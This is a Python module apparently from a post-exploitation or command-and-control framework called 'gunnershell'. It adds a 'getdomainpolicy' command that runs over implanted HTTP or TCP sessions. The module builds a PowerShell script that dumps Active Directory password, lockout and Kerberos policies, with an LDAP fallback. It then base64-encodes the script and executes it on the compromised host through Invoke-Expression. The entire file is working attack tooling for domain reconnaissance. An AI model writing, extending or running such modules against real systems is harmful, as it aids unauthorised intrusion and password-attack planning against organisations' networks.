import argparse
import base64
import os
import sys

from core.gunnershell.commands.base import register, Command, connection_builder
from core.session_handlers import session_manager

# Command Execution Imports
from core.command_execution import http_command_execution as http_exec
from core.command_execution import tcp_command_execution as tcp_exec

from colorama import Style, Fore
brightgreen  = "\001" + Style.BRIGHT + Fore.GREEN  + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred    = "\001" + Style.BRIGHT + Fore.RED    + "\002"

@register("getdomainpolicy", "getpwpolicy")
class GetDomainPolicyCommand(Command):
	"""Dump domain Password, Lockout and Kerberos policies."""

	@property
	def help(self):
		return "getdomainpolicy [-d <domain>] [--dc-ip <ip>]"

	def execute(self, args):
		parser = argparse.ArgumentParser(prog="getdomainpolicy", add_help=False)
		parser.add_argument("-d","--domain", dest="domain", required=False, help="AD domain name (FQDN) or NetBIOS")
		parser.add_argument("--dc-ip",      dest="dc_ip",  required=False, help="IP address of the Domain Controller")

		try:
			opts = parser.parse_args(args)
		except SystemExit:
			print(brightyellow + self.help)
			return

		out = self.logic(
			sid    = self.gs.sid,
			domain = opts.domain,
			dc_ip  = opts.dc_ip,
			op_id  = self.op_id
		)

		if out:
			print(brightgreen + out if "[!]" not in out else out)
		else:
			print(brightred + "[!] No output")

	def logic(self, sid, domain=None, dc_ip=None, op_id="console"):
		"""
		getdomainpolicy [-d <domain>] [--dc-ip <ip>]
		- No flags: dumps the current domain’s PasswordPolicy, LockoutPolicy and KerberosPolicy.
		- -d/--domain: target that AD domain.
		- --dc-ip:     target that DC by IP (falls back to DNS→NetBIOS).
		"""
		sess = session_manager.sessions.get(sid)
		if not sess:
			return brightred + "[!] Invalid session"
		transport = sess.transport.lower()

		# build the PowerShell snippet
		target = dc_ip or domain or None
		if target:
			dns_preamble = connection_builder(dc_ip, domain)

			if dns_preamble == "ERROR":
				return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain correctly"

			server_arg = "-Server $nb"
			root    = '$ldapPath = "LDAP://$nb"; $root = ([ADSI] $ldapPath).defaultNamingContext'
			pol = f"$policy = (Get-ADDefaultDomainPasswordPolicy {server_arg} -ErrorAction SilentlyContinue | Format-List *)"
			lock = f"$lockout = (Get-ADDefaultDomainLockoutPolicy {server_arg} -ErrorAction SilentlyContinue | Format-List *)"
			ker = f"$kerpol = (Get-ADKerberosPolicy {server_arg} -ErrorAction SilentlyContinue | Format-List *)"
		else:
			dns_preamble = ""
			server_arg   = None
			root = '$root = ([ADSI]"LDAP://RootDSE").defaultNamingContext'
			pol = "$policy = (Get-ADDefaultDomainPasswordPolicy -ErrorAction SilentlyContinue | Format-List *)"
			lock = "$lockout = (Get-ADDefaultDomainLockoutPolicy -ErrorAction SilentlyContinue | Format-List *)"
			ker = "$kerpol = (Get-ADKerberosPolicy -ErrorAction SilentlyContinue | Format-List *)"

		ps = f"""
{dns_preamble}
try {{
	if (Get-Command Get-ADDefaultDomainPasswordPolicy -ErrorAction SilentlyContinue) {{
		{pol}

		if (Get-Command Get-ADDefaultDomainLockoutPolicy -ErrorAction SilentlyContinue) {{
		  {lock}
		}} else {{ $lockout = $false }}

		if (Get-Command Get-ADKerberosPolicy -ErrorAction SilentlyContinue) {{
		  {ker}
		}} else {{ $kerpol = $false }}

		if ((-not $policy) -and (-not $lockout) -and (-not $kerpol)) {{ Write-Output "Nothing Found" }}

		if (($policy) -or ($lockout) -or ($kerpol)) {{
		  if ($policy) {{
			Write-Output '=== Password Policy ==='
			Write-Output $policy
		  }}
		  if ($lockout) {{
			Write-Output '\n=== Lockout Policy ==='
			Write-Output $lockout
		  }}
		  if ($kerpol) {{
			Write-Output '\n=== Kerberos Policy ==='
			Write-Output $kerpol
		  }}
		}}
	}} else {{
		# Native LDAP fallback: read policy attributes from domain object
		{root}
		$dom = [ADSI]"LDAP://$root"
		if ($dom) {{
			$li = $dom.Properties['maxPwdAge'][0]
			$rawpwmax = ([uint64]$li.HighPart -shl 32) -bor [uint32]$li.LowPart
			foreach ($prop in 'maxPwdAge','minPwdAge','lockoutDuration','lockoutObservationWindow','msDS-MaxTicketAge','msDS-MaxRenewAge','msDS-MaxServiceTicketAge') {{
			  $li = $dom.Properties[$prop][0]
			  if ($li -is [__ComObject]) {{
				$raw  = ([uint64]$li.HighPart -shl 32) -bor [uint32]$li.LowPart
				$ts   = [TimeSpan]::FromTicks($raw)
				Write-Output (“{{0,-25}} {{1}}” -f $prop, $ts)
			  }} else {{
				  Write-Output (“{{0,-25}} {{1}}” -f $prop, $li)
			  }}
			}}
			Write-Output ("MinPwdLength: "           + $dom.Properties["minPwdLength"][0])
			Write-Output ("LockoutThreshold: "       + $dom.Properties["lockoutThreshold"][0])
			# Kerberos fallback values, if available
		}} else {{
			Write-Output "Nothing Found"
		}}
	}}
}} catch {{
	# On error, repeat native LDAP fallback
	{root}
	$dom = [ADSI]"LDAP://$root"
	if ($dom) {{
		$li = $dom.Properties['maxPwdAge'][0]
		$rawpwmax = ([uint64]$li.HighPart -shl 32) -bor [uint32]$li.LowPart
		foreach ($prop in 'maxPwdAge','minPwdAge','lockoutDuration','lockoutObservationWindow','msDS-MaxTicketAge','msDS-MaxRenewAge','msDS-MaxServiceTicketAge') {{
			$li = $dom.Properties[$prop][0]
			if ($li -is [__ComObject]) {{
			  $raw  = ([uint64]$li.HighPart -shl 32) -bor [uint32]$li.LowPart
			  $ts   = [TimeSpan]::FromTicks($raw)
			  Write-Output (“{{0,-25}} {{1}}” -f $prop, $ts)
			}} else {{
				Write-Output (“{{0,-25}} {{1}}” -f $prop, $li)
			}}
		}}
		Write-Output ("MinPwdLength: "           + $dom.Properties["minPwdLength"][0])
		Write-Output ("LockoutThreshold: "       + $dom.Properties["lockoutThreshold"][0])
		# Kerberos fallback values, if available
	}} else {{
		Write-Output "Nothing Found"
	}}
}}
"""

		b64 = base64.b64encode(ps.encode('utf-16le')).decode()
		one_liner = (
		"$ps = [System.Text.Encoding]::Unicode"
		f".GetString([Convert]::FromBase64String(\"{b64}\")); Invoke-Expression $ps"
		)

		if transport in ("http", "https"):
			out = http_exec.run_command_http(sid, one_liner, op_id=op_id)
	
		elif transport in ("tcp", "tls"):
			out = tcp_exec.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)

		else:
			return brightred + "[!] Unknown session transport!"

		if out:
			if "Failed to resolve DC!" in out:
				return brightred + "[!] Failed to resolve DC, use --dc‑ip or --domain with the correct IP/domain"
		
			elif "Nothing Found" in out:
				return brightred + "[!] No password policy found!"

			else:
				return out